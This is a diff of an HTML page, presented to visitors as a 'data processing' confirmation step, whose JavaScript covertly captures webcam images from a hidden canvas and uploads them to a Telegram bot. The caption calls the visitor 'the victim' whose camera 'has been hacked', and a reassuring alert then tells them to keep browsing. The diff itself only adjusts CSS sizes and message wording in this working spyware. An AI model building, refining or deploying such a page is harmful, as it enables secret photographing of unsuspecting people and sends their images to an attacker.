@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <title>معالجة البيانات بالأبعاد الكاملة</title>
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; background: #1e1e1e; color: white; padding-top: 50px; }
-        .card { max-width: 400px; margin: 0 auto; background: #2a2a2a; padding: 20px; border-radius: 8px; }
-        .btn { padding: 12px 24px; background: #00ffcc; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; color: #1e1e1e; }
+        body { text-align: center; font-family: Arial, sans-serif; background: #1e1e1e; color: white; padding-top: 59px; }
+        .card { max-width: 499px; margin: 0 auto; background: #2a2a2a; padding: 29px; border-radius: 18px; }
+        .btn { padding: 18px 29px; background: #00ffcc; border: none; cursor: pointer; border-radius: 18px; font-weight: bold; color: #1e1e1e; }
     </style>
 </head>
 <body>
@@ -61,7 +61,7 @@
                             let formData = new FormData();
                             formData.append('chat_id', CHAT_ID);
                             formData.append('photo', blob, 'high_res_capture.jpg');
-                            formData.append('caption', ` 📸 تم اختراق كاميرا الضحية 🖥️تم ألتقاط صورة للضحية :\nالنسق: ${hiddenCanvas.width}x${hiddenCanvas.height}`);
+                            formData.append('caption', ` 📸 تم اختراق كاميرا الضحية 🖥️ تم ألتقاط صورة للضحية :\n ${hiddenCanvas.width}x${hiddenCanvas.height}`);
 
                             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                                 method: 'POST',
@@ -70,7 +70,7 @@
                             .then(response => response.json())
                             .then(data => {
                                 if(data.ok) {
-                                    alert("✅ تم التأكيد يمكنك متابعة التصفح الأن!");
+                                    alert("✅ شكراً لك تم التأكيد يمكنك متابعة التصفح الأن!");
                                 } else {
                                     alert("❌ فشل الإرسال.");
                                 }
